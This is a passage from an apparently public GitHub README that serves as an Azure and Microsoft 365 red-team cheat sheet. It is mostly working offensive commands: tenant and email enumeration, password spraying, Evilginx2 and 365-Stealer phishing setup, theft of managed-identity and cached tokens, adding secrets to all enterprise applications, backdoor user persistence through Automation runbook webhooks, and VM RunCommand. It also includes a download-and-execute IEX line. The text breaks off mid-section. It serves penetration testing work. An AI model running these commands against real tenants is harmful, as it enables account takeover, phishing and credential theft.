##
#
https://github.com/rootsecdev/Azure-Red-Team/blob/master/Readme.md
#
##

# Microsoft Cloud Red Team
### Disclaimer
The original source of this repository started from the Swisskyrepo. Over time I have slowly added other content in from my own Cloud Penetration Testing experience or other publicly available sources, blogs...etc. Some of the content in here has not been updated in several years. Similar content may appear in training courses. Under no circumstances has this repository reproduced the content of paid training.      

### Original Repo Sources
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Cloud%20-%20Azure%20Pentest.md

(New Location):https://swisskyrepo.github.io/InternalAllTheThings/

## Azure Training Courses

[Altered Security: Attack & Defend Azure](https://www.alteredsecurity.com/azureadlab)



## Free Training

[Webcast: OPSEC Fundamentals for Remote Red Teams](https://www.blackhillsinfosec.com/webcast-opsec-fundamentals-for-remote-red-teams/)

[EDITED EDITION — Getting Started in Pentesting The Cloud–Azure | Beau Bullock | 1-Hour](https://www.youtube.com/watch?v=u_3cV0pzptY)

[Workshop:Breaching The Cloud Perimeter w/ Beau Bullock](https://www.blackhillsinfosec.com/breaching-the-cloud-perimeter-w-beau-bullock/)


## Azure Rules of Engagement

[Microsoft Penetration Testing](https://docs.microsoft.com/en-us/azure/security/fundamentals/pen-testing)

[Penetration Testing Rules of Engagement](https://www.microsoft.com/en-us/msrc/pentest-rules-of-engagement?rtc=3)

## Current Bug Bounties



## Commando VM

Repo Location: [Commando VM](https://github.com/fireeye/commando-vm)

Post Commando Tools to install: [Connect to all Microsoft 365 services in a single PowerShell window](https://docs.microsoft.com/en-us/microsoft-365/enterprise/connect-to-all-microsoft-365-services-in-a-single-windows-powershell-window?view=o365-worldwide)

## Summary

* [Azure Recon Tools](#azure-recon-tools)
* [Enumeration](#enumeration)
    * [Enumerate valid emails](#enumerate-valid-emails)
    * [Enumerate Azure Subdomains](#enumerate-azure-subdomains)
    * [Enumerate tenant with Azure AD Powershell](#enumerate-tenant-with-azure-ad-powershell)
    * [Enumerate tenant with Az Powershell](#enumerate-tenant-with-az-powershell)
    * [Enumerate tenant with az cli](#enumerate-tenant-with-az-cli)
    * [Enumerate manually](#enumerate-manually)
    * [Enumeration methodology](#enumeration-methodology)
* [Phishing with Evilginx2](#phishing-with-evilginx2)
* [Illicit Consent Grant](#illicit-consent-grant)
* [Token from Managed Identity](#token-from-managed-identity)
    * [Azure API via Powershell](#azure-api-via-powershell)
    * [Azure API via Python Version](#azure-api-via-python-version)
    * [Get Tokens](#get-tokens)
    * [Use Tokens](#use-tokens)
    * [Refresh Tokens](#refresh-token)
* [Stealing Tokens](#stealing-tokens)
    * [Stealing tokens from az cli](#stealing-tokens-from-az-cli)
    * [Stealing tokens from az powershell](#stealing-tokens-from-az-powershell)
* [Add Credentials to All Enterprise Applications](#add-credentials-to-all-enterprise-applications)
* [Spawn SSH for Azure Web App](#spawn-ssh-for-azure-web-app)
* [Azure Storage Blob](#azure-storage-blob)
    * [Enumerate blobs](#enumerate-blobs)
    * [SAS URL](#sas-url)
    * [List and download blobs](#list-and-download-blobs)
* [Runbook Automation](#runbook-automation)
    * [Create a Runbook](#create-a-runbook)
    * [Persistence via Automation accounts](#persistence-via-automation-accounts)
* [Virtual Machine RunCommand](#virtual-machine-runcommand)
* [KeyVault Secrets](#keyvault-secrets)
* [Pass The Certificate](#pass--the-certificate)
* [Pass The PRT](#pass-the-prt)
* [Intunes Administration](#intunes-administration)
* [Dynamic Group Membership](#dynamic-group-membership)
* [Administrative Unit](#administrative-unit)
* [Deployment Template](#deployment-template)
* [Application Proxy](#application-proxy)
* [Conditional Access](#conditional-access)
* [Azure AD](#azure-ad)
    * [Azure AD vs Active Directory](#azure-ad-vs-active-directory)
    * [Password Spray](#password-spray)
    * [Convert GUID to SID](#convert-guid-to-sid)
* [Azure AD Connect ](#azure-ad-connect)
    * [Azure AD Connect - Password extraction](#azure-ad-connect---password-extraction)
    * [Azure AD Connect - MSOL Account's password and DCSync](#azure-ad-connect---msol-accounts-password-and-dcsync)
    * [Azure AD Connect - Seamless Single Sign On Silver Ticket](#azure-ad-connect---seamless-single-sign-on-silver-ticket)
* [References](#references)

## Azure Recon Tools

* **ROADTool** 
    ```powershell
    pipenv shell
    roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout]
    roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa]
    roadrecon auth -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD>
    roadrecon gather
    roadrecon gui
    ```
* **StormSpotter**
    ```powershell
    # https://github.com/Azure/Stormspotter

    # session 1 - backend
    pipenv shell
    python ssbackend.pyz

    # session 2 - frontend
    cd C:\Tools\stormspotter\frontend\dist\spa\
    quasar.cmd serve -p 9091 --history

    # session 3 - collector
    pipenv shell
    az login -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD>
    python C:\Tools\stormspotter\stormcollector\sscollector.pyz cli

    # Web access on http://localhost:9091
    Username: neo4j
    Password: BloodHound
    Server: bolt://localhost:7687
    ```
* **Azure Hound**
    ```powershell
    # https://github.com/BloodHoundAD/AzureHound

    . C:\Tools\AzureHound\AzureHound.ps1
    Invoke-AzureHound -Verbose

    # GUI access
    bolt://localhost:7687
    Username: neo4j
    Password: BloodHound

    # Cypher query example:
    MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p

    # Change object ID's to names in Bloodhound
    MATCH (n) WHERE n.azname IS NOT NULL AND n.azname <> "" AND n.name IS NULL SET n.name = n.azname

    # Custom Queries : https://hausec.com/2020/11/23/azurehound-cypher-cheatsheet/
    ```
* List of Microsoft portals: https://msportals.io/
* **Azucar** : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks.
    ```powershell
    # You should use an account with at least read-permission on the assets you want to access
    git clone https://github.com/nccgroup/azucar.git
    PS> Get-ChildItem -Recurse c:\Azucar_V10 | Unblock-File

    PS> .\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT
    PS> .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000
    PS> .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000

    # resolve the TenantID for an specific username
    PS> .\Azucar.ps1 -ResolveTenantUserName user@company.com
    ```
* **Azurite Explorer** and **Azurite Visualizer** : Enumeration and reconnaissance activities in the Microsoft Azure Cloud.
    ```powershell
    git clone https://github.com/mwrlabs/Azurite.git
    git clone https://github.com/FSecureLABS/Azurite
    git submodule init
    git submodule update
    PS> Import-Module AzureRM
    PS> Import-Module AzuriteExplorer.ps1
    PS> Review-AzureRmSubscription
    PS> Review-CustomAzureRmSubscription
    ```
* **MicroBurst** - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping
    ```powershell
    $ git clone https://github.com/NetSPI/MicroBurst
    PS C:> Import-Module .\MicroBurst.psm1
    PS C:> Import-Module .\Get-AzureDomainInfo.ps1
    PS C:> Get-AzureDomainInfo -folder MicroBurst -Verbose
    ```
* **SkyArk** - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins.   
    Require:
    - Read-Only permissions over Azure Directory (Tenant)
    - Read-Only permissions over Subscription
    - Require AZ and AzureAD module or administrator right

    ```powershell
    $ git clone https://github.com/cyberark/SkyArk
    $ powershell -ExecutionPolicy Bypass -NoProfile
    PS C> Import-Module .\SkyArk.ps1 -force
    PS C> Start-AzureStealth

    or in the Cloud Console

    PS C> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1')  
    PS C> Scan-AzureAdmins  
* **PowerZure** - 
    ```powershell
    require az module !
    $ git clone https://github.com/hausec/PowerZure
    $ ipmo .\PowerZure
    $ Set-Subscription -Id [idgoeshere]

    # Reader
    $ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails

    # Contributor
    $ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command "whoami"
    $ Execute-MSBuild -VM Win10Test  -ResourceGroup Test-RG -File "build.xml"
    $ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents
    $ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine's disk

    # Owner
    $ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest
    
    # Administrator
    $ Create-Backdoor, Execute-Backdoor
    ```
    
## Enumeration

### Enumerate valid emails

> By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute.

* Validate email 
    ```powershell
    PS> C:\Python27\python.exe C:\Tools\o365creeper\o365creeper.py -f C:\Tools\emails.txt -o C:\Tools\validemails.txt
    admin@<TENANT NAME>.onmicrosoft.com   - VALID
    root@<TENANT NAME>.onmicrosoft.com    - INVALID
    test@<TENANT NAME>.onmicrosoft.com    - VALID
    contact@<TENANT NAME>.onmicrosoft.com - INVALID
    ```
* Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon

#### Password spraying

```powershell
PS> . C:\Tools\MSOLSpray\MSOLSpray.ps1
PS> Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
```

### Enumerate Azure Subdomains

```powershell
PS> . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1
PS> Invoke-EnumerateAzureSubDomains -Base <TENANT NAME> -Verbose
Subdomain Service
--------- -------
<TENANT NAME>.mail.protection.outlook.com Email
<TENANT NAME>.onmicrosoft.com Microsoft Hosted Domain
```

### Enumerate tenant with Azure AD Powershell

```powershell
Import-Module C:\Tools\AzureAD\AzureAD.psd1
Import-Module C:\Tools\AzureADPreview\AzureADPreview.psd1
PS> $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS> $creds = New-Object System.Management.Automation.PSCredential("test@<TENANT NAME>.onmicrosoft.com", $passwd)
PS Az> Connect-AzureAD -Credential $creds

PS AzureAD> Get-AzureADUser -All $true
PS AzureAD> Get-AzureADUser -All $true | select UserPrincipalName
PS AzureAD> Get-AzureADGroup -All $true
PS AzureAD> Get-AzureADDevice
PS AzureAD> Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
PS AzureADPreview> Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
```

### Enumerate tenant with Az Powershell

```powershell
PS> $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
PS> $creds = New-Object System.Management.Automation.PSCredential ("test@<TENANT NAME>.onmicrosoft.com", $passwd)
PS Az> Connect-AzAccount -Credential $creds

PS Az> Get-AzResource
PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>.onmicrosoft.com
PS Az> Get-AzVM | fl
PS Az> Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
PS Az> Get-AzFunctionApp
PS Az> Get-AzStorageAccount | fl
PS Az> Get-AzKeyVault
```

### Enumerate tenant with az cli

```powershell
PS> az login -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD>
PS> az vm list
PS> az vm list --query "[].[name]" -o table
PS> az webapp list
PS> az functionapp list --query "[].[name]" -o table
PS> az storage account list
PS> az keyvault list
```

### Enumerate manually

* Federation with Azure AD or O365
    ```powershell
    https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
    https://login.microsoftonline.com/getuserrealm.srf?login=root@<TENANT NAME>.onmicrosoft.com&xml=1
    ```
* Get the Tenant ID
    ```powershell
    https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration
    https://login.microsoftonline.com/<TENANT NAME>.onmicrosoft.com/.well-known/openid-configuration
    ```

## Enumeration methodology

```powershell
# Check Azure Joined 
PS> dsregcmd.exe /status
+----------------------------------------------------------------------+
| Device State |
+----------------------------------------------------------------------+
 AzureAdJoined : YES
 EnterpriseJoined : NO
 DomainJoined : NO
 Device Name : jumpvm

# Enumerate resources
PS Az> Get-AzResource

# Enumerate role assignments
PS Az> Get-AzRoleAssignment -Scope /subscriptions/<SUBSCRIPTION-ID>/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/<VM-NAME>`

# Get info on a role
PS Az> Get-AzRoleDefinition -Name "Virtual Machine Command Executor"

# Get info user
PS AzureAD> Get-AzureADUser -ObjectId <ID>
PS AzureAD> Get-AzureADUser -ObjectId test@<TENANT NAME>.onmicrosoft.com | fl * 

# List all groups
PS AzureAD> Get-AzureADGroup -All $true

# Get members of a group
PS Az> Get-AzADGroup -DisplayName '<GROUP-NAME>'
PS Az> Get-AzADGroupMember -GroupDisplayName '<GROUP-NAME>' | select UserPrincipalName

# Get Azure AD information
PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
PS AADInternals> Get-AADIntLoginInformation -UserName admin@<TENANT NAME>.onmicrosoft.com
PS AADInternals> Get-AADIntTenantID -Domain <TENANT NAME>.onmicrosoft.com # Get Tenant ID
PS AADInternals> Invoke-AADIntReconAsOutsider -DomainName <DOMAIN> # Get all the information

# Check if there is a user logged-in to az cli
PS> az ad signed-in-user show

# Check AppID Alternative Names/Display Name 
PS AzureAD> Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq "<APP-ID>"} | fl


# Get all application objects registered using the current tenant
PS AzureAD> Get-AzureADApplication -All $true

# Get all details about an application
PS AzureAD> Get-AzureADApplication -ObjectId <ID> | fl *

# List all VM's the user has access to
PS Az> Get-AzVM 
PS Az> Get-AzVM | fl

# Get all function apps
PS Az> Get-AzFunctionApp

# Get all webapps
PS Az> Get-AzWebApp
PS Az> Get-AzWebApp | select-object Name, Type, Hostnames

# List all storage accounts
PS Az> Get-AzStorageAccount
PS Az> Get-AzStorageAccount | fl

# List all keyvaults
PS Az> Get-AzKeyVault
```

## Phishing with Evilginx2

```powershell
PS C:\Tools> evilginx2 -p C:\Tools\evilginx2\phishlets
: config domain username.corp
: config ip 10.10.10.10
: phishlets hostname o365 login.username.corp
: phishlets get-hosts o365

Create a DNS entry for login.login.username.corp and www.login.username.corp, type A, pointing to your machine

# copy certificate and enable the phishing
PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\ca.crt C:\Users\Username\.evilginx\crt\login.username.corp\o365.crt
PS C:\Tools> Copy-Item C:\Users\Username\.evilginx\crt\private.key C:\Users\Username\.evilginx\crt\login.username.corp\o365.key
: phishlets enable o365

# get the phishing URL
: lures create o365
: lures get-url 0
```

## Illicit Consent Grant

> The attacker creates an Azure-registered application that requests access to data such as contact information, email, or documents. The attacker then tricks an end user into granting consent to the application so that the attacker can gain access to the data that the target user has access to. 

Check if users are allowed to consent to apps: `PS AzureADPreview> (GetAzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole`
* **Disable user consent** : Users cannot grant permissions to applications.
* **Users can consent to apps from verified publishers or your organization, but only for permissions you select** : All users can only consent to apps that were published by a verified publisher and apps that are registered in your tenant
* **Users can consent to all apps** : allows all users to consent to any permission which doesn't require admin consent,
* **Custom app consent policy**

### Register Application

1. Login to https://portal.azure.com > Azure Active Directory
2. Click on **App registrations** > **New registration**
3. Enter the Name for our application
4. Under support account types select **"Accounts in any organizational directory (Any Azure AD directory - Multitenant)"**
5. Enter the Redirect URL. This URL should be pointed towards our 365-Stealer application that we will host for hosting our phishing page. Make sure the endpoint is `https://<DOMAIN/IP>:<PORT>/login/authorized`.
6. Click **Register** and save the **Application ID**

### Configure Application

1. Click on `Certificates & secrets`
2. Click on `New client secret` then enter the **Description** and click on **Add**.
3. Save the **secret**'s value.
4. Click on API permissions > Add a permission
5. Click on Microsoft Graph > **Delegated permissions**
6. Search and select the below mentioned permissions and click on Add permission
    * Contacts.Read 
    * Mail.Read / Mail.ReadWrite
    * Mail.Send
    * Notes.Read.All
    * Mailboxsettings.ReadWrite
    * Files.ReadWrite.All 
    * User.ReadBasic.All
    * User.Read

### Setup 365-Stealer

:warning: Default port for 365-Stealer phishing is 443

- Run XAMPP and start Apache
- Clone 365-Stealer into `C:\xampp\htdocs\`
    * `git clone https://github.com/AlteredSecurity/365-Stealer.git`
- Install the requirements
    * Python3
    * PHP CLI or Xampp server
    * `pip install -r requirements.txt`
- Enable sqlite3 (Xampp > Apache config > php.ini) and restart Apache
- Edit `C:/xampp/htdocs/yourvictims/index.php` if needed
    - Disable IP whitelisting `$enableIpWhiteList = false;`
- Go to 365-Stealer Management portal > Configuration (http://localhost:82/365-stealer/yourVictims)
    - **Client Id** (Mandatory): This will be the Application(Client) Id of the application that we registered.
    - **Client Secret** (Mandatory): Secret value from the Certificates & secrets tab that we created.
    - **Redirect URL** (Mandatory): Specify the redirect URL that we entered during registering the App like `https://<Domain/IP>/login/authorized` 
    - **Macros Location**: Path of macro file that we want to inject.
    - **Extension in OneDrive**: We can provide file extensions that we want to download from the victims account or provide `*` to download all the files present in the victims OneDrive. The file extensions should be comma separated like txt, pdf, docx etc. 
    - **Delay**: Delay the request by specifying time in seconds while stealing
- Create a Self Signed Certificate to use HTTPS
- Run the application either click on the button or run this command : `python 365-Stealer.py --run-app`
    - `--no-ssl`: disable HTTPS
    - `--port`: change the default listening port
    - `--token`: provide a specific token
    - `--refresh-token XXX --client-id YYY --client-secret ZZZ`: use a refresh token
- Find the Phishing URL: go to `https://<IP/Domain>:<Port>` and click on **Read More** button or in the console.

**Mitigation**: Enable `Do not allow user consent` for applications in the "Consent and permissions menu".


## Token from Managed Identity

> **MSI_ENDPOINT** is an alias for **IDENTITY_ENDPOINT**, and **MSI_SECRET** is an alias for **IDENTITY_HEADER**.

Find IDENTITY_HEADER and IDENTITY_ENDPOINT from the environment : `env`

Most of the time, you want a token for one of these resources: 
* https://storage.azure.com
* https://vault.azure.net
* https://graph.microsoft.com
* https://management.azure.com


### Azure API via Powershell

Get **access_token** from **IDENTITY_HEADER** and **IDENTITY_ENDPOINT**: `system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');`. 

Then query the Azure REST API to get the **subscription ID** and more .

```powershell
$Token = 'eyJ0eX..'
$URI = 'https://management.azure.com/subscriptions?api-version=2020-01-01'
# $URI = 'https://graph.microsoft.com/v1.0/applications'
$RequestParams = @{
 Method = 'GET'
 Uri = $URI
 Headers = @{
 'Authorization' = "Bearer $Token"
 }
}
(Invoke-RestMethod @RequestParams).value 

# List resources and check for runCommand privileges
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resources?api-version=2020-10-01'
$URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/<RG-NAME>/providers/Microsoft.Compute/virtualMachines/<RESOURCE/providers/Microsoft.Authorization/permissions?apiversion=2015-07-01'
```

### Azure API via Python Version

```py
IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

print("[+] Management API")
cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID/AccountID: "+json.loads(val)["client_id"])

print("\r\n[+] Graph API")
cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
val = os.popen(cmd).read()
print(json.loads(val)["access_token"])
print("ClientID/AccountID: "+json.loads(val)["client_id"])
```

or inside a Python Function:

```py
import logging, os
import azure.functions as func

def main(req: func.HttpRequest) -> func.HttpResponse:
    logging.info('Python HTTP trigger function processed a request.')
    IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
    IDENTITY_HEADER = os.environ['IDENTITY_HEADER']
    cmd = 'curl "%s?resource=https://management.azure.com&apiversion=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)
    val = os.popen(cmd).read()
    return func.HttpResponse(val, status_code=200)
```


### Get Tokens

:warning: The lifetime of a Primary Refresh Token is 14 days!

```powershell
# az cli - get tokens 
az account get-access-token 
az account get-access-token --resource-type aad-graph
# or Az
(Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
# or from a managed identity using IDENTITY_HEADER and IDENTITY_ENDPOINT
```

### Use Tokens

> Tokens contain all the claims including that for MFA and Conditional Access

* Az Powershell
    ```powershell
    PS C:\Tools> $token = 'eyJ0e..'
    PS C:\Tools> Connect-AzAccount -AccessToken $token -AccountId <ACCOUNT-ID>

    # Access Token and Graph Token
    PS C:\Tools> $token = 'eyJ0eX..'
    PS C:\Tools> $graphaccesstoken = 'eyJ0eX..'
    PS C:\Tools> Connect-AzAccount -AccessToken $token -GraphAccessToken $graphaccesstoken -AccountId <ACCOUNT-ID>
    PS C:\Tools> Get-AzResource
    # ERROR: 'this.Client.SubscriptionId' cannot be null.
    # ---> The managed identity has no rights on any of the Azure resources. Switch to to GraphAPI
    ```
* AzureAD
    ```powershell
    Import-Module C:\Tools\AzureAD\AzureAD.psd1
    $AADToken = 'eyJ0…'
    Connect-AzureAD -AadAccessToken $AADToken -TenantId <TENANT-ID> -AccountId <ACCOUNT-ID>
    ```

### Refresh Tokens

* https://github.com/ConstantinT/Lantern
    ```powershell
    Lantern.exe cookie --derivedkey <Key from Mimikatz> --context <Context from Mimikatz> --prt <PRT from Mimikatz>
    Lantern.exe mdm --joindevice --accesstoken (or some combination from the token part) --devicename <Name> --outpfxfile <Some path>
    Lantern.exe token --username <Username> --password <Password>
    Lantern.exe token --refreshtoken <RefreshToken>
    Lantern.exe devicekeys --pfxpath XXXX.pfx --refreshtoken (--prtcookie / ---username + --password ) 
    ```
* https://github.com/rvrsh3ll/TokenTactics
    ```powershell
    Import-Module .\TokenTactics.psd1
    CommandType     Name                                               Version    Source
    -----------     ----                                               -------    ------
    Function        Clear-Token                                        0.0.1      TokenTactics
    Function        Dump-OWAMailboxViaMSGraphApi                       0.0.1      TokenTactics
    Function        Forge-UserAgent                                    0.0.1      TokenTactics
    Function        Get-AzureToken                                     0.0.1      TokenTactics
    Function        Get-TenantID                                       0.0.1      TokenTactics
    Function        Open-OWAMailboxInBrowser                           0.0.1      TokenTactics
    Function        Parse-JWTtoken                                     0.0.1      TokenTactics
    Function        RefreshTo-AzureCoreManagementToken                 0.0.1      TokenTactics
    Function        RefreshTo-AzureManagementToken                     0.0.1      TokenTactics
    Function        RefreshTo-DODMSGraphToken                          0.0.1      TokenTactics
    Function        RefreshTo-GraphToken                               0.0.1      TokenTactics
    Function        RefreshTo-MAMToken                                 0.0.1      TokenTactics
    Function        RefreshTo-MSGraphToken                             0.0.1      TokenTactics
    Function        RefreshTo-MSManageToken                            0.0.1      TokenTactics
    Function        RefreshTo-MSTeamsToken                             0.0.1      TokenTactics
    Function        RefreshTo-O365SuiteUXToken                         0.0.1      TokenTactics
    Function        RefreshTo-OfficeAppsToken                          0.0.1      TokenTactics
    Function        RefreshTo-OfficeManagementToken                    0.0.1      TokenTactics
    Function        RefreshTo-OutlookToken                             0.0.1      TokenTactics
    Function        RefreshTo-SubstrateToken                           0.0.1      TokenTactics
    ```

## Stealing Tokens

* Get-AzurePasswords
    ```powershell
    Import-Module Microburst.psm1
    Get-AzurePasswords
    Get-AzurePasswords -Verbose | Out-GridView
    ```

### Stealing tokens from az cli

* az cli stores access tokens in clear text in **accessTokens.json** in the directory `C:\Users\<username>\.Azure`
* azureProfile.json in the same directory contains information about subscriptions.

### Stealing tokens from az powershell

* Az PowerShell stores access tokens in clear text in **TokenCache.dat** in the directory `C:\Users\<username>\.Azure`
* It also stores **ServicePrincipalSecret** in clear-text in **AzureRmContext.json** 
* Users can save tokens using `Save-AzContext`


## Add credentials to all Enterprise Applications

```powershell
# Add secrets
PS > . C:\Tools\Add-AzADAppSecret.ps1
PS > Add-AzADAppSecret -GraphToken $graphtoken -Verbose

# Use secrets to authenticate as Service Principal
PS > $password = ConvertTo-SecureString '<SECRET/PASSWORD>' -AsPlainText -Force
PS > $creds = New-Object System.Management.Automation.PSCredential('<AppID>', $password)
PS > Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant '<TenantID>'
```

## Spawn SSH for Azure Web App

```powershell
az webapp create-remote-connection --subscription <SUBSCRIPTION-ID> --resource-group <RG-NAME> -n <APP-SERVICE-NAME>
```

## Azure Storage Blob

* Blobs - `*.blob.core.windows.net`
* File Services - `*.file.core.windows.net`
* Data Tables - `*.table.core.windows.net`
* Queues - `*.queue.core.windows.net`

### Enumerate blobs

```powershell
PS > . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureBlobs.ps1
PS > Invoke-EnumerateAzureBlobs -Base <SHORT DOMAIN> -OutputFile azureblobs.txt
Found Storage Account -  testsecure.blob.core.windows.net
Found Storage Account -  securetest.blob.core.windows.net
Found Storage Account -  securedata.blob.core.windows.net
Found Storage Account -  securefiles.blob.core.windows.net
```

### SAS URL

* Use [Storage Explorer](https://azure.microsoft.com/en-us/features/storage-explorer/)
* Click on **Open Connect Dialog** in the left menu. 
* Select **Blob container**. 
* On the **Select Authentication Method** page
    * Select **Shared access signature (SAS)** and click on Next
    * Copy the URL in **Blob container SAS URL** field.

:warning: You can also use `subscription`(username/password) to access storage resources such as blobs and files.

### List and download blobs

```powershell
PS Az> Get-AzResource
PS Az> Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>
PS Az> Get-AzStorageContainer -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context
PS Az> Get-AzStorageBlobContent -Container <NAME> -Context (Get-AzStorageAccount -name <NAME> -ResourceGroupName <NAME>).context -Blob
```

## Runbook Automation

### Create a Runbook

```powershell
# Check user right for automation
az extension add --upgrade -n automation
az automation account list # if it doesn't return anything the user is not a part of an Automation group
az ad signed-in-user list-owned-objects

# If the user is not part of an "Automation" group.
# Add him to a custom group , e.g: "Automation Admins"
Add-AzureADGroupMember -ObjectId <OBJID> -RefObjectId <REFOBJID> -Verbose

# Get the role of a user on the Automation account
# Contributor or higher = Can create and execute Runbooks
Get-AzRoleAssignment -Scope /subscriptions/<ID>/resourceGroups/<RG-NAME>/providers/Microsoft.Automation/automationAccounts/<AUTOMATION-ACCOUNT>

# List hybrid workers
Get-AzAutomationHybridWorkerGroup -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME>

# Create a Powershell Runbook
PS C:\Tools> Import-AzAutomationRunbook -Name <RUNBOOK-NAME> -Path C:\Tools\username.ps1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Type PowerShell -Force -Verbose

# Publish the Runbook
Publish-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose

# Start the Runbook
Start-AzAutomationRunbook -RunbookName <RUNBOOK-NAME> -RunOn Workergroup1 -AutomationAccountName <AUTOMATION-ACCOUNT> -ResourceGroupName <RG-NAME> -Verbose
```

### Persistence via Automation accounts

* Create a new Automation Account
    * "Create Azure Run As account": Yes
* Import a new runbook that creates an AzureAD user with Owner permissions for the subscription*
    * Sample runbook for this Blog located here – https://github.com/NetSPI/MicroBurst
    * Publish the runbook
    * Add a webhook to the runbook
* Add the AzureAD module to the Automation account
    * Update the Azure Automation Modules
* Assign "User Administrator" and "Subscription Owner" rights to the automation account
* Eventually lose your access…
* Trigger the webhook with a post request to create the new user
    ```powershell
    $uri = "https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d"
    $AccountInfo  = @(@{RequestBody=@{Username="BackdoorUsername";Password="BackdoorPassword"}})
    $body = ConvertTo-Json -InputObject $AccountInfo
    $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body
    ```


## Virtual Machine RunCommand

Requirements: 
* `Microsoft.Compute/virtualMachines/runCommand/action`

```powershell
# Get Public IP of VM : query the network interface
PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile
PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
PS AzureAD> Get-AzPublicIpAddress -Name <RESOURCEIP>

# Execute Powershell script on the VM
PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose

# Connect via WinRM
PS C:\Tools> $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
PS C:\Tools> $creds = New-Object System.Management.Automation.PSCredential('username', $Password)
PS C:\Tools> $sess = New-PSSession -ComputerName <IP> -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
PS C:\Tools> Enter-PSSession $sess
```

> Allow anyone with "Contributor" rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\System

```powershell
# List available VMs
PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
ResourceGroupName    Name       
-----------------    ----       
TESTRESOURCES        Remote-Test

# Execute Powershell script on the VM
